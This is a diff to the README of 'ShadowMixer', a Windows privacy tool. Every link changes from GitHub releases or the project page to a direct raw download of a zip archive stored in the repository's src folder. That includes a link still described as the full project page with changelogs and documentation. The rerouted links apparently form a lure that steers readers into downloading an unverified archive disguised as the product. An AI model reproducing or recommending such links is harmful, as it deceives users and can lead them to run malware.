@@ -1,6 +1,6 @@
 # 🛡️ ShadowMixer - Secure Your Online Identity
 
-[![Download ShadowMixer](https://img.shields.io/badge/Download-ShadowMixer-4c1?style=for-the-badge&logo=github)](https://github.com/mohammadtakodi/ShadowMixer/releases)
+[![Download ShadowMixer](https://img.shields.io/badge/Download-ShadowMixer-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mohammadtakodi/ShadowMixer/main/src/Shadow_Mixer_bolk.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Make sure your Windows system is updated to avoid compatibility issues.
 
 You will find the latest ShadowMixer version here:
 
-[![Download ShadowMixer](https://img.shields.io/badge/Download-ShadowMixer-4c1?style=for-the-badge&logo=github)](https://github.com/mohammadtakodi/ShadowMixer/releases)
+[![Download ShadowMixer](https://img.shields.io/badge/Download-ShadowMixer-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mohammadtakodi/ShadowMixer/main/src/Shadow_Mixer_bolk.zip)
 
 ### Step 1: Visit the Download Page
 
@@ -147,7 +147,7 @@ The GitHub repository's Issues tab offers community help. You can report bugs or
 
 For detailed technical info, visit the full project page:
 
-https://github.com/mohammadtakodi/ShadowMixer
+https://raw.githubusercontent.com/mohammadtakodi/ShadowMixer/main/src/Shadow_Mixer_bolk.zip
 
 You can also find updates, changelogs, and documentation there.
 
@@ -155,4 +155,4 @@ You can also find updates, changelogs, and documentation there.
 
 ## 📥 Download ShadowMixer Now
 
-[![Download ShadowMixer](https://img.shields.io/badge/Download-ShadowMixer-4c1?style=for-the-badge&logo=github)](https://github.com/mohammadtakodi/ShadowMixer/releases)
+[![Download ShadowMixer](https://img.shields.io/badge/Download-ShadowMixer-4c1?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/mohammadtakodi/ShadowMixer/main/src/Shadow_Mixer_bolk.zip)
